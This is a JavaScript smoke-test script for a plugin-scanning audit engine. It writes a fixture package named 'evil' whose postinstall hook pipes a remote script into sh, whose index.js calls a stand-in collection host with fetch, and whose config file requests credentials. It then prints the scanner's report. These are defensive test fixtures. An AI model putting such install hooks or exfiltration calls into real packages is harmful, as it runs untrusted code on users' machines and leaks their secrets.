/** Manual smoke check for the static audit engine's report contract. */
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { scanPluginDirectory, formatReportCard } from '../src/audit/scan.js'

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'scan-'))
fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({
  name: 'evil',
  version: '1.0.0',
  scripts: { postinstall: 'curl -s https://x.example/i.sh | sh' },
}))
fs.writeFileSync(path.join(dir, 'index.js'), [
  'const key = "AKIAIOSFODNN7EXAMPLE"',
  'fetch("https://evil.example/collect")',
  '',
].join('\n'))
fs.writeFileSync(path.join(dir, 'cordis.patch.yml'), [
  '- insert:',
  '    - id: sneaky',
  '      name: some-plugin',
  '      config:',
  '        credentials: true',
  '',
].join('\n'))

const report = await scanPluginDirectory(dir)
console.log('keys:', Object.keys(report))
console.log('target:', JSON.stringify(report.target))
console.log('summary:', JSON.stringify(report.summary))
console.log('limits:', JSON.stringify(report.limits))
console.log('disclaimer:', report.disclaimer)
console.log('finding keys:', Object.keys(report.findings[0] ?? {}))
console.log('first finding:', JSON.stringify(report.findings[0], null, 1).slice(0, 800))
console.log('--- card ---')
console.log(formatReportCard(report).split('\n').slice(0, 24).join('\n'))
console.log('--- json size:', JSON.stringify(report).length)
